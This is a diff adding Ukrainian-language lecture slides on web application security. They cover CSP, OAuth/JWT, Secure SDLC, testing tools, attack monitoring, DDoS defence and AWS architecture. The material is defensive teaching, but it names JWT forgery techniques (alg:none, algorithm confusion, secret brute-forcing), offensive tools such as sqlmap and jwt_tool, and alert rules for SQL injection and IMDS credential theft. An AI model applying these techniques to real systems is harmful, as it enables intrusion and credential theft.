+   script-src 'self' 'nonce-{random}';
+   style-src 'self';
+   img-src 'self' data: https:;
+   object-src 'none';
+   frame-ancestors 'none';";</code></pre>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#238636;">
+                            🔧 <strong>Перевірка:</strong> securityheaders.com, Mozilla Observatory — безкоштовний скан заголовків
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 16: OAuth 2.0, JWT, OpenID Connect ===== -->
+            <section>
+                <h2>OAuth 2.0, JWT та OpenID Connect</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🔑 OAuth 2.0 — Authorization Framework</h3>
+                        <div class="box" style="border-color:#1f6feb; font-size:0.78em;">
+                            <p><strong>Flows:</strong></p>
+                            <ul>
+                                <li><span class="tag-green">Authorization Code + PKCE</span> — веб та мобільні apps ✅</li>
+                                <li><span class="tag">Client Credentials</span> — M2M (мікросервіси, API)</li>
+                                <li><span class="tag-red">Implicit</span> — застарілий, НЕ використовувати</li>
+                                <li><span class="tag-red">Resource Owner Password</span> — небезпечний</li>
+                            </ul>
+                        </div>
+                        <h3 style="margin-top:0.4em;">🎫 JWT — JSON Web Token</h3>
+                        <pre><code># Структура: header.payload.signature
+# Payload (приклад):
+{
+  "sub": "user-123",
+  "iss": "https://auth.example.com",
+  "aud": "api.example.com",
+  "exp": 1712000000,  # ← обов'язково!
+  "roles": ["user"]
+}</code></pre>
+                    </div>
+                    <div>
+                        <h3>⚠️ Типові вразливості JWT</h3>
+                        <ul style="font-size:0.8em;">
+                            <li><span class="tag-red">alg: none</span> — підроблення без підпису</li>
+                            <li><span class="tag-red">RS256→HS256</span> — підміна алгоритму</li>
+                            <li>Відсутність <code>exp</code> — токен діє вічно</li>
+                            <li>Слабкий секрет для HS256 — брутфорс</li>
+                            <li>Відсутність перевірки <code>aud</code> та <code>iss</code></li>
+                        </ul>
+                        <h3 style="margin-top:0.3em;">🔐 OpenID Connect</h3>
+                        <p style="font-size:0.8em;">Надбудова над OAuth 2.0 для аутентифікації (хто ти?). Додає <code>id_token</code>, <code>userinfo</code> endpoint, стандартні claims.</p>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#238636;">
+                            ✅ <strong>AWS Cognito:</strong> OIDC provider + OAuth 2.0 + JWT + MFA + Social login (Google, Facebook)
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 17: Secure SDLC та Shift-Left ===== -->
+            <section>
+                <h2>Secure SDLC та Shift-Left Security</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>📐 Фази Secure SDLC</h3>
+                        <table>
+                            <thead><tr><th>Фаза</th><th>Активність безпеки</th><th>Інструменти</th></tr></thead>
+                            <tbody>
+                                <tr><td>📋 Планування</td><td>Threat Modeling</td><td>STRIDE, PASTA, draw.io</td></tr>
+                                <tr><td>🏗️ Проектування</td><td>Security Architecture Review</td><td>OWASP ASVS</td></tr>
+                                <tr><td>💻 Розробка</td><td>Secure coding, SAST, Code Review</td><td>SonarQube, Semgrep</td></tr>
+                                <tr><td>🧪 Тестування</td><td>DAST, Pen Testing, Fuzzing</td><td>OWASP ZAP, Burp Suite</td></tr>
+                                <tr><td>🚀 Деплой</td><td>SAST у CI/CD, Image Scanning</td><td>Trivy, Inspector</td></tr>
+                                <tr><td>📊 Продуктив</td><td>WAF, SIEM, Runtime Security</td><td>AWS WAF, GuardDuty</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <div>
+                        <h3>⬅️ Shift-Left: безпека раніше = дешевше</h3>
+                        <div class="box" style="border-color:#1f6feb; font-size:0.78em;">
+                            <p>Вартість виправлення вразливостей зростає exponentially:</p>
+                            <ul>
+                                <li><span class="tag-green">Вимоги</span>: $1 (найдешевше)</li>
+                                <li><span class="tag-green">Проектування</span>: $5</li>
+                                <li><span class="tag">Розробка</span>: $15</li>
+                                <li><span class="tag">QA</span>: $30</li>
+                                <li><span class="tag-red">Продуктив</span>: $150+ (найдорожче)</li>
+                            </ul>
+                        </div>
+                        <h3 style="margin-top:0.4em;">🎯 OWASP ASVS — стандарт верифікації</h3>
+                        <ul style="font-size:0.8em;">
+                            <li><strong>Рівень 1</strong> — базова безпека (всі застосунки)</li>
+                            <li><strong>Рівень 2</strong> — стандартний (більшість застосунків)</li>
+                            <li><strong>Рівень 3</strong> — критичні системи (банки, телеком)</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 18: Інструменти тестування безпеки ===== -->
+            <section>
+                <h2>Інструменти тестування безпеки веб-застосунків</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🔍 SAST — Static Application Security Testing</h3>
+                        <table>
+                            <thead><tr><th>Інструмент</th><th>Мови</th><th>Примітка</th></tr></thead>
+                            <tbody>
+                                <tr><td><span class="tag-green">Semgrep</span></td><td>20+ мов</td><td>Відкритий, швидкий, custom rules</td></tr>
+                                <tr><td><span class="tag">SonarQube</span></td><td>25+ мов</td><td>CI/CD інтеграція, технічний борг</td></tr>
+                                <tr><td><span class="tag">Bandit</span></td><td>Python</td><td>AST-аналіз Python-коду</td></tr>
+                                <tr><td><span class="tag">CodeQL</span></td><td>C/C++/Java/JS</td><td>GitHub Advanced Security</td></tr>
+                            </tbody>
+                        </table>
+                        <h3 style="margin-top:0.4em;">🌐 DAST — Dynamic Application Security Testing</h3>
+                        <table>
+                            <thead><tr><th>Інструмент</th><th>Тип</th><th>Примітка</th></tr></thead>
+                            <tbody>
+                                <tr><td><span class="tag-green">OWASP ZAP</span></td><td>DAST (open)</td><td>CI/CD, API scanning</td></tr>
+                                <tr><td><span class="tag">Burp Suite</span></td><td>DAST (Pro)</td><td>Золотий стандарт пентестингу</td></tr>
+                                <tr><td><span class="tag">Nikto</span></td><td>Scanner</td><td>Швидкий скан заголовків та версій</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <div>
+                        <h3>🔑 Спеціалізовані інструменти</h3>
+                        <ul style="font-size:0.82em;">
+                            <li><span class="tag">sqlmap</span> — автоматичне знаходження SQL Injection</li>
+                            <li><span class="tag">ffuf / gobuster</span> — fuzzing директорій та параметрів</li>
+                            <li><span class="tag">jwt_tool</span> — тестування JWT-токенів</li>
+                            <li><span class="tag">nuclei</span> — шаблонний сканер CVE та конфігурацій</li>
+                            <li><span class="tag">Amass / subfinder</span> — reconnaissance поддоменів</li>
+                            <li><span class="tag">Postman / Bruno</span> — API-тестування</li>
+                        </ul>
+                        <h3 style="margin-top:0.4em;">📊 Bug Bounty платформи</h3>
+                        <ul style="font-size:0.82em;">
+                            <li><span class="tag-green">HackerOne</span> — найбільша платформа, програми великих компаній</li>
+                            <li><span class="tag-green">Bugcrowd</span> — managed bug bounty</li>
+                            <li><span class="tag">Intigriti</span> — популярна в Європі</li>
+                        </ul>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#238636;">
+                            ✅ <strong>AWS:</strong> Amazon CodeGuru Security (SAST), Amazon Inspector (DAST для Lambda), Security Hub (агрегація)
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 19: Моніторинг та виявлення атак ===== -->
+            <section>
+                <h2>Моніторинг та виявлення атак на веб-застосунки</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>📊 Що логувати обов'язково</h3>
+                        <ul style="font-size:0.82em;">
+                            <li>Всі спроби автентифікації (успіх / невдача) + IP</li>
+                            <li>Зміни прав доступу та облікових записів</li>
+                            <li>HTTP 400/403/500 помилки (аномальна кількість)</li>
+                            <li>Запити до чутливих endpoints (<code>/admin</code>, <code>/api/keys</code>)</li>
+                            <li>WAF-спрацьовування та заблоковані запити</li>
+                            <li>SQL errors та stack traces у відповідях</li>
+                            <li>Аномальний обсяг запитів від одного IP</li>
+                        </ul>
+                        <div class="box" style="border-color:#da3633; font-size:0.75em; margin-top:0.3em;">
+                            ⚠️ <strong>OWASP A09:</strong> відсутність логування та моніторингу дозволяє атакам тривати <strong>277 днів</strong> у середньому (IBM Cost of Data Breach)
+                        </div>
+                    </div>
+                    <div>
+                        <h3>🔔 Сигнали для алертів</h3>
+                        <table>
+                            <thead><tr><th>Подія</th><th>Поріг</th><th>Дія</th></tr></thead>
+                            <tbody>
+                                <tr><td>Brute force логін</td><td>&gt; 5 за 1 хв</td><td>Block IP, alert</td></tr>
+                                <tr><td>SQLi у WAF</td><td>Будь-який</td><td>Block + alert</td></tr>
+                                <tr><td>HTTP 403 spike</td><td>+300% норми</td><td>Investigate</td></tr>
+                                <tr><td>New admin account</td><td>Будь-який</td><td>Alert Security</td></tr>
+                                <tr><td>Дані з IMDS</td><td>Будь-який запит</td><td>Критичний alert</td></tr>
+                            </tbody>
+                        </table>
+                        <h3 style="margin-top:0.3em;">☁️ AWS Інструменти моніторингу</h3>
+                        <ul style="font-size:0.8em;">
+                            <li><span class="tag">AWS WAF Logs</span> → Kinesis → S3 / Athena</li>
+                            <li><span class="tag">CloudWatch</span> — метрики, аномалії, дашборди</li>
+                            <li><span class="tag">GuardDuty</span> — ML-детекція загроз (автоматично)</li>
+                            <li><span class="tag">Security Hub</span> — агрегація всіх findings</li>
+                            <li><span class="tag">CloudTrail</span> — аудит всіх AWS API-дій</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 20: DDoS атаки та захист ===== -->
+            <section>
+                <h2>DDoS-атаки та захист веб-рівня</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>💣 Типи DDoS-атак на веб</h3>
+                        <table>
+                            <thead><tr><th>Тип</th><th>Рівень OSI</th><th>Приклад</th></tr></thead>
+                            <tbody>
+                                <tr><td>Volumetric</td><td>L3/L4</td><td>UDP flood, ICMP flood, DNS amp</td></tr>
+                                <tr><td>Protocol</td><td>L4</td><td>SYN flood, Smurf attack</td></tr>
+                                <tr><td><span class="highlight">Application</span></td><td>L7</td><td>HTTP flood, Slowloris, POST flood</td></tr>
+                                <tr><td>Resource exhaustion</td><td>L7</td><td>ReDoS, XML Bomb, ZIP Bomb</td></tr>
+                                <tr><td>Bot attacks</td><td>L7</td><td>Credential stuffing, scraping</td></tr>
+                            </tbody>
+                        </table>
+                        <div class="box" style="border-color:#da3633; font-size:0.75em; margin-top:0.3em;">
+                            💥 <strong>Slowloris:</strong> відкриває тисячі з'єднань і надсилає заголовки дуже повільно → вичерпує пул потоків веб-сервера
+                        </div>
+                    </div>
+                    <div>
+                        <h3>🛡️ Ешелонована оборона від DDoS</h3>
+                        <div class="box" style="border-color:#238636; font-size:0.8em;">
+                            <p>☁️ <strong>Рівень 1 — ISP/CDN:</strong> CloudFront, Anycast routing</p>
+                            <p>🛡️ <strong>Рівень 2 — AWS Shield:</strong> L3/L4 автоматично</p>
+                            <p>🔥 <strong>Рівень 3 — AWS WAF:</strong> rate limiting, geo-block</p>
+                            <p>⚖️ <strong>Рівень 4 — ALB:</strong> slow request timeout, connection limits</p>
+                            <p>💻 <strong>Рівень 5 — Застосунок:</strong> CAPTCHA, queue, circuit breaker</p>
+                        </div>
+                        <h3 style="margin-top:0.3em;">📋 Rate Limiting (приклад)</h3>
+                        <pre><code># Nginx rate limiting:
+limit_req_zone $binary_remote_addr
+  zone=login:10m rate=5r/m;
+
+location /login {
+  limit_req zone=login burst=3;
+}</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 21: Кращі практики захисту ===== -->
+            <section>
+                <h2>Кращі практики захисту веб-застосунків</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>✅ Рівень застосунку</h3>
+                        <ul style="font-size:0.82em;">
+                            <li>Валідація всіх вхідних даних (whitelist, server-side)</li>
+                            <li>Параметризовані запити для всіх БД-взаємодій</li>
+                            <li>Output encoding у контексті виводу (HTML, JS, URL)</li>
+                            <li>Мінімальні привілеї для БД-користувачів і сервісних акаунтів</li>
+                            <li>Безпечне управління секретами (Secrets Manager, HashiCorp Vault)</li>
+                            <li>Dependency scanning (Snyk, Dependabot) — регулярно</li>
+                            <li>Security headers на всіх відповідях</li>
+                        </ul>
+                        <h3 style="margin-top:0.4em;">✅ Рівень аутентифікації</h3>
+                        <ul style="font-size:0.82em;">
+                            <li>MFA для всіх привілейованих дій</li>
+                            <li>bcrypt/Argon2id для паролів</li>
+                            <li>Безпечне відновлення паролю (short-lived токени)</li>
+                            <li>Перевірка на витоки (Have I Been Pwned API)</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3>✅ Рівень інфраструктури</h3>
+                        <ul style="font-size:0.82em;">
+                            <li>HTTPS скрізь, HSTS preloading</li>
+                            <li>WAF перед кожним публічним endpoint</li>
+                            <li>Мережева сегментація (DMZ, Private subnets)</li>
+                            <li>Regular penetration testing (щоквартально)</li>
+                            <li>Patch management — критичні ≤ 24год, важливі ≤ 7 днів</li>
+                        </ul>
+                        <h3 style="margin-top:0.4em;">✅ Рівень процесів</h3>
+                        <ul style="font-size:0.82em;">
+                            <li>Threat Modeling на етапі проектування</li>
+                            <li>Code Review з фокусом на безпеку</li>
+                            <li>SAST/DAST у кожному CI/CD pipeline</li>
+                            <li>Incident Response Plan для веб-застосунків</li>
+                            <li>Security Champions у кожній команді</li>
+                        </ul>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#1f6feb;">
+                            📚 Стандарт: <strong>OWASP ASVS Level 2</strong> — чек-ліст із 286 вимог для веб-застосунків
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 22: Архітектура захищеного веб-застосунку ===== -->
+            <section>
+                <h2>Архітектура захищеного веб-застосунку в AWS</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🏗️ Ешелонована оборона (Defence in Depth)</h3>
+                        <div class="box" style="border-color:#1f6feb; font-size:0.8em;">
+                            <p>🌐 <strong>DNS:</strong> Route 53 + Shield Advanced</p>
+                            <p>☁️ <strong>CDN:</strong> CloudFront + TLS 1.3 + OAC</p>
+                            <p>🔥 <strong>WAF:</strong> AWS WAF (Managed Rules + Custom)</p>
+                            <p>⚖️ <strong>Load Balancer:</strong> ALB + ACM сертифікат</p>
+                            <p>🔒 <strong>Auth:</strong> Cognito + MFA + JWT</p>
+                            <p>💻 <strong>App:</strong> ECS/EKS (non-root, read-only FS)</p>
+                            <p>🗄️ <strong>DB:</strong> RDS + шифрування + VPC Private Subnet</p>
+                            <p>🔑 <strong>Secrets:</strong> AWS Secrets Manager</p>
+                            <p>📊 <strong>Моніторинг:</strong> GuardDuty + Security Hub + CloudTrail</p>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>📐 Принципи архітектури</h3>
+                        <ul style="font-size:0.82em;">
+                            <li><span class="highlight">Zero Trust</span> — перевіряй завжди, довіряй нікому</li>
+                            <li><span class="highlight">Least Privilege</span> — мінімальні права для кожного компонента</li>
+                            <li><span class="highlight">Defence in Depth</span> — кілька незалежних рівнів захисту</li>
+                            <li><span class="highlight">Fail Secure</span> — при помилці — заборона, не дозвіл</li>
+                            <li><span class="highlight">Separation of Concerns</span> — розподіл відповідальності</li>
+                        </ul>
+                        <table style="margin-top:0.3em;">
+                            <thead><tr><th>Компонент</th><th>AWS-сервіс</th><th>Захищає від</th></tr></thead>
+                            <tbody>
+                                <tr><td>WAF</td><td>AWS WAF</td><td>OWASP Top 10</td></tr>
+                                <tr><td>DDoS</td><td>Shield + CF</td><td>L3/L4/L7 DDoS</td></tr>
+                                <tr><td>Auth</td><td>Cognito</td><td>Auth attacks</td></tr>
+                                <tr><td>Secrets</td><td>Secrets Mgr</td><td>Credential leak</td></tr>
+                                <tr><td>Detection</td><td>GuardDuty</td><td>Threats/anomalies</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== КІНЕЦЬ ПЕРШОЇ ПОЛОВИНИ =====
+                 Наступний агент має додати слайди 23-38 тут,
+                 перед закриваючими тегами </div></div> та Reveal.initialize().
+                 Детальний план кожного слайду — у файлі PLAN.md.
+            ===== -->
+
+        </div>
+    </div>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            transition: 'slide',
+            slideNumber: 'c/t',
+            center: false,
+            width: 1650,
+            height: 900,
+            margin: 0.04,
+            minScale: 0.2,
+            maxScale: 1.0,
+            scrollActivationWidth: 700
+        });
+    </script>
+</body>
+</html>
